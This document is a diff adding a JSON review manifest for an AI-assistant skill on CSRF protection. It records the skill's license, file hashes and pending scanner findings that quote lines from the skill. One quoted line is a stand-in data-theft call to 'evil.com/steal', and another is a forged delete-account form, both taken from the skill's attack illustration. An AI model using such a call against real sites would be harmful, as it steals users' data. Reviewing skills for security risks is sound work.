@@ -1,0 +1,392 @@
+{
+  "schema_version": "0.1",
+  "skill_id": "harperaa/csrf-protection",
+  "status": "draft",
+  "reviewed_on": null,
+  "reviewer": null,
+  "source": {
+    "repo": "harperaa/secure-claude-skills",
+    "path": "csrf-protection",
+    "revision": "c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223"
+  },
+  "inventory": {
+    "complete": true,
+    "scope": "csrf-protection",
+    "url": "https://api.github.com/repos/harperaa/secure-claude-skills/git/trees/c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223?recursive=1",
+    "notes": "Generated from git ls-tree at the pinned revision; confirm no ancestor NOTICE or nested licensing override."
+  },
+  "license": {
+    "spdx": "MIT",
+    "scope": "repository",
+    "path": "LICENSE.txt",
+    "source_path": "LICENSE",
+    "url": "https://github.com/harperaa/secure-claude-skills/blob/c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223/LICENSE",
+    "ancestor_check": {
+      "complete": true,
+      "overrides": [],
+      "checked": [
+        "csrf-protection"
+      ]
+    },
+    "redistributable": true,
+    "scope_reason": "",
+    "obligations": [
+      "Ship a byte-exact copy of the repository-root license, including its copyright notice, with the skill.",
+      "Preserve all upstream text and notices byte-for-byte."
+    ]
+  },
+  "content_review": {
+    "status": "pending",
+    "risk": "unknown",
+    "blocking_findings": [],
+    "capabilities": {},
+    "notes": []
+  },
+  "files": [
+    {
+      "path": "LICENSE.txt",
+      "attached": true,
+      "source_path": "LICENSE",
+      "sha256": "e8f0d88e88dafeb5ba3503df8babaf5ef1c49323d6c1751c09989d29740fa919",
+      "bytes": 1069,
+      "mode": "100644",
+      "git_blob": "346d6fb05afd34a37fb0b156a612166534ffc7d9",
+      "license": "MIT",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "",
+      "findings": []
+    },
+    {
+      "path": "SKILL.md",
+      "sha256": "f179dc8609da088a6e1bf7a728c2e43913311357354e180246a1d630a003f2ca",
+      "bytes": 16334,
+      "mode": "100644",
+      "git_blob": "2a76daa234175f9e5dcf3f16843ec3cdba6207a6",
+      "license": "MIT",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "",
+      "findings": [
+        {
+          "type": "filesystem-write",
+          "line": 3,
+          "evidence": "DELETE",
+          "context": "description: Implement Cross-Site Request Forgery (CSRF) protection for API routes. Use this skill when you need to protect POST/PUT/DELETE endpoints, implement token validation, prevent cross-site attacks, or secure form submissions. Trigg",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 37,
+          "evidence": "secret",
+          "context": "   - Even if intercepted, attackers can't forge tokens without secret key",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "filesystem-write",
+          "line": 66,
+          "evidence": "DELETE",
+          "context": "For any POST/PUT/DELETE endpoint:",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "filesystem-write",
+          "line": 261,
+          "evidence": "delete",
+          "context": "<form action=\"https://yourapp.com/api/delete-account\" method=\"POST\">",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 261,
+          "evidence": "https://",
+          "context": "<form action=\"https://yourapp.com/api/delete-account\" method=\"POST\">",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 282,
+          "evidence": "https://",
+          "context": "    fetch('https://evil.com/steal', {",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 313,
+          "evidence": "secret",
+          "context": "  const secret = process.env.CSRF_SECRET;",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 313,
+          "evidence": "process.env",
+          "context": "  const secret = process.env.CSRF_SECRET;",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 314,
+          "evidence": "secret",
+          "context": "  if (!secret) {",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 322,
+          "evidence": "secret",
+          "context": "  const hmac = createHmac('sha256', secret)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 334,
+          "evidence": "secret",
+          "context": "  const secret = process.env.CSRF_SECRET;",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 334,
+          "evidence": "process.env",
+          "context": "  const secret = process.env.CSRF_SECRET;",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 335,
+          "evidence": "secret",
+          "context": "  if (!secret || !token) return false;",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 341,
+          "evidence": "secret",
+          "context": "  const expectedHmac = createHmac('sha256', secret)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "filesystem-write",
+          "line": 397,
+          "evidence": "DELETE",
+          "context": "❌ **DON'T skip CSRF for POST/PUT/DELETE**",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 437,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 439,
+          "evidence": "curl",
+          "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 439,
+          "evidence": "http://",
+          "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 443,
+          "evidence": "curl",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 443,
+          "evidence": "http://",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 454,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 455,
+          "evidence": "curl",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 455,
+          "evidence": "http://",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 464,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 465,
+          "evidence": "curl",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 465,
+          "evidence": "http://",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 475,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 477,
+          "evidence": "curl",
+          "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 477,
+          "evidence": "http://",
+          "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 481,
+          "evidence": "curl",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 481,
+          "evidence": "http://",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 487,
+          "evidence": "curl",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 487,
+          "evidence": "http://",
+          "context": "curl -X POST http://localhost:3000/api/example-protected \\",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 505,
+          "evidence": "process.env",
+          "context": "  secure: process.env.NODE_ENV === 'production',    // HTTPS only in prod",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 542,
+          "evidence": "process.env",
+          "context": "  secure: process.env.NODE_ENV === 'production',",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 552,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 560,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 575,
+          "evidence": "https://",
+          "context": "- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 576,
+          "evidence": "https://",
+          "context": "- OWASP Top 10 2021 - A01 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 577,
+          "evidence": "https://",
+          "context": "- MDN SameSite Cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
+          "disposition": "pending",
+          "reason": ""
+        }
+      ]
+    }
+  ]
+}
